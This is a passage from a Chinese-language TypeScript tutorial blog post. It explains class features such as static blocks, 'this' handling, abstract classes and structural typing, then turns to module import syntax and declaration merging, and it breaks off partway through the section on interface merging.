<h4 id="类里的-static区块"><a href="#类里的-static区块" class="headerlink" title="类里的 static区块"></a>类里的 static区块</h4><p>静态块允许你写一串有自己作用域的语句，可以访问包含类中的私有字段。这意味着我们可以用写语句的所有能力来写初始化代码，不泄露变量，并能完全访问我们类的内部结构</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> #count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">count</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Foo</span>.#count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> lastInstances = &#123;</span><br><span class="line">                <span class="attr">length</span>: <span class="number">100</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="title class_">Foo</span>.#count += lastInstances.<span class="property">length</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="类运行时中的this"><a href="#类运行时中的this" class="headerlink" title="类运行时中的this"></a>类运行时中的this</h3><p>TypeScript并没有改变JavaScript的运行时行为，而JavaScript的运行时行为偶尔很奇特。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  name = <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line">  <span class="title function_">getName</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;obj&quot;</span>,</span><br><span class="line">  <span class="attr">getName</span>: c.<span class="property">getName</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 输出 &quot;obj&quot;, 而不是 &quot;MyClass&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getName</span>())</span><br></pre></td></tr></table></figure>

<p>长话短说，默认情况下，函数内this的值取决于函数的调用方式。在这个例子中，因为函数是通过obj引用调用的，所以它的this值是obj而不是类实例。</p>
<h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><p>如果你有一个经常会被调用的函数，失去了它的 this 上下文，那么使用一个箭头函数而不是方法定义是有意义的。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  name = <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line">  getName = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">const</span> g = c.<span class="property">getName</span>;</span><br><span class="line"><span class="comment">// 输出 &quot;MyClass&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">g</span>());</span><br></pre></td></tr></table></figure>

<p>这有一些权衡：</p>
<ul>
<li>this 值保证在运行时是正确的，即使是没有经过TypeScript检查的代码也是如此。</li>
<li>这将使用更多的内存，因为每个类实例将有它自己的副本，每个函数都是这样定义的。</li>
<li>你不能在派生类中使用 super.getName ，因为在原型链中没有入口可以获取基类方法。</li>
</ul>
<h4 id="this-参数"><a href="#this-参数" class="headerlink" title="this 参数"></a>this 参数</h4><p>在方法或函数定义中，一个名为 this 的初始参数在TypeScript中具有特殊的意义。这些参数在编译过程</p>
<p>中会被删除。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 带有 &quot;this&quot; 参数的 TypeScript 输入</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"><span class="variable language_">this</span>: SomeType, x: <span class="built_in">number</span></span>) &#123;</span><br><span class="line"> <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编译后的JavaScript结果</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">x</span>) &#123;</span><br><span class="line"> <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TypeScript检查调用带有 this 参数的函数，是否在正确的上下文中进行。我们可以不使用箭头函数，而是在方法定义中添加一个 this 参数，以静态地确保方法被正确调用。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  name = <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line">  <span class="title function_">getName</span>(<span class="params"><span class="variable language_">this</span>: MyClass</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line">c.<span class="title function_">getName</span>();</span><br><span class="line"><span class="comment">// 错误</span></span><br><span class="line"><span class="keyword">const</span> g = c.<span class="property">getName</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">g</span>());</span><br></pre></td></tr></table></figure>

<p>这种方法做出了与箭头函数方法相反的取舍：</p>
<ul>
<li><p>JavaScript调用者仍然可能在不知不觉中错误地使用类方法</p>
</li>
<li><p>每个类定义只有一个函数被分配，而不是每个类实例一个函数</p>
</li>
<li><p>基类方法定义仍然可以通过 super 调用。</p>
</li>
</ul>
<h3 id="this类型"><a href="#this类型" class="headerlink" title="this类型"></a>this类型</h3><p>在类中，一个叫做 this 的特殊类型动态地指向当前类的类型。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span> &#123;</span><br><span class="line">    <span class="attr">content</span>: <span class="built_in">string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">value: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">content</span> = value;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Box&#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClearableBox</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Box</span> &#123;</span><br><span class="line">    <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title class_">ClearableBox</span>();</span><br><span class="line"><span class="keyword">const</span> b = a.<span class="title function_">set</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Box ClearableBox &#123; content: <span class="string">&#x27;hello&#x27;</span> &#125;</span><br><span class="line">ClearableBox &#123; content: <span class="string">&#x27;hello&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>

<p>Box类set方法的this指向了ClearableBox类。</p>
<p>参数类型注释中使用this，如果你有一个派生类，它的sameAs方法现在只接受该同一派生类的其他实例了。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span> &#123;</span><br><span class="line">    <span class="attr">content</span>: <span class="built_in">string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">sameAs</span>(<span class="params">other: <span class="variable language_">this</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> other.<span class="property">content</span> === <span class="variable language_">this</span>.<span class="property">content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedBox</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Box</span> &#123;</span><br><span class="line">    <span class="attr">otherContent</span>: <span class="built_in">string</span> = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> base = <span class="keyword">new</span> <span class="title class_">Box</span>();</span><br><span class="line"><span class="keyword">const</span> derived = <span class="keyword">new</span> <span class="title class_">DerivedBox</span>();</span><br><span class="line"><span class="keyword">const</span> derivedc = <span class="keyword">new</span> <span class="title class_">DerivedBox</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(derived.<span class="title function_">sameAs</span>(derivedc));</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * error </span></span><br><span class="line"><span class="comment"> * 类型“Box”的参数不能赋给类型“DerivedBox”的参数。</span></span><br><span class="line"><span class="comment"> * 类型 &quot;Box&quot; 中缺少属性 &quot;otherContent&quot;，但类型 &quot;DerivedBox&quot; 中需要该属性。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(derived.<span class="title function_">sameAs</span>(base));</span><br></pre></td></tr></table></figure>

<h3 id="基于类型守卫的this"><a href="#基于类型守卫的this" class="headerlink" title="基于类型守卫的this"></a>基于类型守卫的this</h3><p>常用的一个地方是允许对一个特定字段进行惰性验证。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&lt;T&gt; &#123;</span><br><span class="line">  value?: T;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">hasValue</span>(): <span class="variable language_">this</span> is &#123; <span class="attr">value</span>: T &#125; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span> !== <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> box = <span class="keyword">new</span> <span class="title class_">Box</span>();</span><br><span class="line">box.<span class="property">value</span> = <span class="string">&#x27;Gameboy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (property) Box&lt;unknown&gt;.value?: unknownbox.value;</span></span><br><span class="line"><span class="keyword">if</span> (box.<span class="title function_">hasValue</span>()) &#123;</span><br><span class="line">  <span class="comment">// (property) value: unk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参数属性"><a href="#参数属性" class="headerlink" title="参数属性"></a>参数属性</h3><p>在构造函数中加入参数属性，可以简写了，不用在外面定义属性了。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Params</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> <span class="keyword">readonly</span> x: <span class="built_in">number</span>, <span class="keyword">protected</span> y: <span class="built_in">number</span>, <span class="keyword">private</span> z: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * error</span></span><br><span class="line"><span class="comment"> * 无法重新声明块范围变量“p”。</span></span><br><span class="line"><span class="comment"> * 属性“y”受保护，只能在类“Params”及其子类中访问。</span></span><br><span class="line"><span class="comment"> * 属性“z”为私有属性，只能在类“Params”中访问。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Params</span>(<span class="number">100</span>, <span class="number">300</span>, <span class="number">400</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">x</span>);</span><br></pre></td></tr></table></figure>

<h3 id="类表达式写法"><a href="#类表达式写法" class="headerlink" title="类表达式写法"></a>类表达式写法</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> someClass = <span class="keyword">class</span>&lt;<span class="title class_">Type</span>&gt; &#123;</span><br><span class="line">    <span class="attr">content</span>: <span class="title class_">Type</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">value: Type</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">content</span> = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> m = <span class="keyword">new</span> <span class="title function_">someClass</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(m.<span class="property">content</span>);</span><br></pre></td></tr></table></figure>

<h3 id="抽象类和成员"><a href="#抽象类和成员" class="headerlink" title="抽象类和成员"></a>抽象类和成员</h3><p>抽象类不能被实例化，即不能用new，需要常见派生类来实现抽象成员。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"> <span class="keyword">abstract</span> <span class="title function_">getName</span>(): <span class="built_in">string</span>;</span><br><span class="line"> <span class="title function_">printName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, &quot;</span> + <span class="variable language_">this</span>.<span class="title function_">getName</span>());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line">  <span class="title function_">getName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Derived</span>();</span><br><span class="line">d.<span class="title function_">printName</span>();</span><br></pre></td></tr></table></figure>

<h4 id="抽象构造签名"><a href="#抽象构造签名" class="headerlink" title="抽象构造签名"></a>抽象构造签名</h4><p>有时候你想接受一些类的构造函数，产生一个从某些抽象类派生出来的类的实例。</p>
<p>可能想这样写：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">ctor: <span class="keyword">typeof</span> Base</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> instance = <span class="keyword">new</span> <span class="title function_">ctor</span>(); <span class="comment">// 无法创建抽象类的实例。</span></span><br><span class="line">  instance.<span class="title function_">printName</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Typescript正确地告诉你，你正试图实例化一个抽象类。毕竟，鉴于green的定义，写的这段代码是完全合法的，他最终会构造一个抽象类。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line"><span class="title function_">greet</span>(<span class="title class_">Base</span>)</span><br></pre></td></tr></table></figure>

<p>相反，你想写一个函数，接受具有结构化签名的东西：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">ctor: <span class="keyword">new</span> () =&gt; Base</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> instance = <span class="keyword">new</span> <span class="title function_">ctor</span>();</span><br><span class="line">    instance.<span class="title function_">printName</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">greet</span>(<span class="title class_">Derived</span>);</span><br><span class="line"><span class="comment">// greet(Base);</span></span><br></pre></td></tr></table></figure>

<p>现在TypeScript正确地告诉你哪些类的构造函数可以被调用： Derived 可以，因为它是具体的，但Base 不能。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 类型“typeof Base”的参数不能赋给类型“new () =&gt; Base”的参数。</span></span><br><span class="line"><span class="comment"># 无法将抽象构造函数类型分配给非抽象构造函数类型。</span></span><br></pre></td></tr></table></figure>

<h3 id="类之间的关系"><a href="#类之间的关系" class="headerlink" title="类之间的关系"></a>类之间的关系</h3><p>相同的两个类之间可以相互代替使用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point1</span> &#123;</span><br><span class="line"> x = <span class="number">0</span>;</span><br><span class="line"> y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point2</span> &#123;</span><br><span class="line"> x = <span class="number">0</span>;</span><br><span class="line"> y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">p</span>: <span class="title class_">Point1</span> = <span class="keyword">new</span> <span class="title class_">Point2</span>();</span><br></pre></td></tr></table></figure>

<p>包含关系的两个类之间也可以使用，小的类作为类型。这句话的理解：即使没有明确的继承，类之间的子类型关系也是存在的。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point1</span> &#123;</span><br><span class="line"> x = <span class="number">0</span>;</span><br><span class="line"> y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point2</span> &#123;</span><br><span class="line"> x = <span class="number">0</span>;</span><br><span class="line"> y = <span class="number">0</span>;</span><br><span class="line">  z = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// right</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">p</span>: <span class="title class_">Point1</span> = <span class="keyword">new</span> <span class="title class_">Point2</span>();</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">p</span>: <span class="title class_">Point2</span> = <span class="keyword">new</span> <span class="title class_">Point1</span>();</span><br></pre></td></tr></table></figure>

<p>下面这种情况会特殊点，空的类没有成员，在一个结构化类型系统中，一个没有成员的类型通常是其他任何类型的超类。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Empty</span> &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">x: Empty</span>) &#123;</span><br><span class="line">  <span class="comment">// 不能用x做任何事</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 以下均可调用</span></span><br><span class="line">!<span class="title function_">fn</span>(<span class="variable language_">window</span>);</span><br><span class="line"><span class="title function_">fn</span>(&#123;&#125;);</span><br><span class="line"><span class="title function_">fn</span>(fn);</span><br></pre></td></tr></table></figure>

<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="认识模块"><a href="#认识模块" class="headerlink" title="认识模块"></a>认识模块</h3><p>主要考虑三个：</p>
<ul>
<li>语法：我想用什么语法来导入和导出？</li>
<li>模块解析：模块名称（或路径）和磁盘上的文件之间是什么关系？</li>
<li>模块输出目标：我编译出来的js模块应该是什么样子的？</li>
</ul>
<h3 id="额外的导入语法"><a href="#额外的导入语法" class="headerlink" title="额外的导入语法"></a>额外的导入语法</h3><p>示例的目录结构</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">+-- src</span><br><span class="line">|   --- export.ts</span><br><span class="line">|   --- index.ts</span><br></pre></td></tr></table></figure>

<p>export.ts</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> pi = <span class="number">3.14</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">RandomNumberGenerator</span> &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>index.ts 引入 export.ts</p>
<p>写法一</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">RNGen</span>, &#123; pi <span class="keyword">as</span> π &#125; <span class="keyword">from</span> <span class="string">&#x27;./export&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(π);</span><br><span class="line"><span class="keyword">const</span> rnGen = <span class="keyword">new</span> <span class="title class_">RNGen</span>();</span><br></pre></td></tr></table></figure>

<p>写法二</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> math <span class="keyword">from</span> <span class="string">&#x27;./export&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="property">pi</span>);</span><br><span class="line"><span class="keyword">const</span> rnGen = <span class="keyword">new</span> math.<span class="title function_">default</span>();</span><br></pre></td></tr></table></figure>

<h3 id="TS特定的ES模块语法"><a href="#TS特定的ES模块语法" class="headerlink" title="TS特定的ES模块语法"></a>TS特定的ES模块语法</h3><p>如果是扩展类型和常规结合使用，写法如下：</p>
<p>示例的目录结构</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">+-- src</span><br><span class="line">|   --- export.ts</span><br><span class="line">|   --- index.ts</span><br></pre></td></tr></table></figure>

<p>export.ts</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">Cat</span> = &#123;</span><br><span class="line">  <span class="attr">breed</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">yearOfBirth</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">  <span class="attr">breed</span>: <span class="built_in">string</span>[];</span><br><span class="line">  <span class="attr">yearOfBirth</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">createCatName</span> = (<span class="params"></span>) =&gt; <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>index.ts</p>
<p>如果只引入扩展类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Cat</span>, <span class="title class_">Dog</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./export&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">Cat</span>, <span class="title class_">Dog</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./export&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>如果引入扩展类型和非扩展类型的其他东西，如函数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createCatName, <span class="keyword">type</span> <span class="title class_">Cat</span>, <span class="keyword">type</span> <span class="title class_">Dog</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./export&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>注意，引入<code>export.ts</code>时，是不带<code>.ts</code>的，因为编译后的是js，而非ts文件。</p>
<h2 id="声明合并"><a href="#声明合并" class="headerlink" title="声明合并"></a>声明合并</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>TypeScript 中的一些独特概念在类型级别描述了 JavaScript 对象的形状。TypeScript 特别独特的一个例子是“声明合并”的概念。理解这个概念将使您在使用现有 JavaScript 时更有优势。它还为更高级的抽象概念打开了大门。</p>
<p>就本文而言，“声明合并”是指编译器将两个单独的同名声明合并为一个定义。这个合并的定义具有两个原始声明的特征。可以合并任意数量的声明；它不仅限于两个声明。</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在 TypeScript 中，声明至少在三组中的一组中创建实体：命名空间、类型或值。创建命名空间的声明创建了一个命名空间，其中包含使用点分符号访问的名称。类型创建声明就是这样做的：它们创建一个类型，该类型对声明的形状可见并绑定到给定的名称。最后，创建值的声明创建在输出 JavaScript 中可见的值。</p>
<table>
<thead>
<tr>
<th align="left">Declaration Type</th>
<th align="left">Namespace</th>
<th align="left">Type</th>
<th align="left">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Namespace</td>
<td align="left">X</td>
<td align="left"></td>
<td align="left">X</td>
</tr>
<tr>
<td align="left">Class</td>
<td align="left"></td>
<td align="left">X</td>
<td align="left">X</td>
</tr>
<tr>
<td align="left">Enum</td>
<td align="left"></td>
<td align="left">X</td>
<td align="left">X</td>
</tr>
<tr>
<td align="left">Interface</td>
<td align="left"></td>
<td align="left">X</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Type Alias</td>
<td align="left"></td>
<td align="left">X</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Function</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">X</td>
</tr>
<tr>
<td align="left">Variable</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">X</td>
</tr>
</tbody></table>
<p>了解每个声明创建的内容将帮助您了解执行声明合并时合并的内容。</p>
<h3 id="合并接口"><a href="#合并接口" class="headerlink" title="合并接口"></a>合并接口</h3><p>最简单，也许是最常见的声明合并类型是接口合并。在最基本的层面上，合并将两个声明的成员机械地连接到一个同名的接口中。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Box</span> &#123;</span><br><span class="line">  <span class="attr">height</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">width</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Box</span> &#123;</span><br><span class="line">  <span class="attr">scale</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">box</span>: <span class="title class_">Box</span> = &#123; <span class="attr">height</span>: <span class="number">5</span>, <span class="attr">width</span>: <span class="number">6</span>, <span class="attr">scale</span>: <span class="number">10</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>接口的非函数成员应该是唯一的。如果它们不是唯一的，则它们必须属于同一类型。如果接口都声明了同名但类型不同的非函数成员，编译器将发出错误。</p>
<p>对于函数成员，每个同名的函数成员都被视为描述同一函数的重载。同样值得注意的是，在接口<code>A</code>与后来的接口<code>A</code>合并的情况下，<strong>第二个接口将比第一个接口具有更高的优先级</strong>。</p>
<p>也就是说，在示例中：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Cloner</span> &#123;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Animal</span>): <span class="title class_">Animal</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Cloner</span> &#123;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Sheep</span>): <span class="title class_">Sheep</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Cloner</span> &#123;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Dog</span>): <span class="title class_">Dog</span>;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Cat</span>): <span class="title class_">Cat</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这三个接口将合并以创建一个声明，如下所示：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Cloner</span> &#123;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Dog</span>): <span class="title class_">Dog</span>;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Cat</span>): <span class="title class_">Cat</span>;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Sheep</span>): <span class="title class_">Sheep</span>;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="attr">animal</span>: <span class="title class_">Animal</span>): <span class="title class_">Animal</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意，每个组的元素都保持相同的顺序，但组本身是合并的，后来的重载组先排序。</p>
<p>此规则的一个例外是专用签名。如果签名的参数类型是<em>单个</em>字符串文字类型（例如，不是字符串文字的并集），那么它将冒泡到其合并的重载列表的顶部。</p>
<blockquote>
<p>并集也称联合</p>
</blockquote>
<p>例如，以下接口将合并在一起：</p>
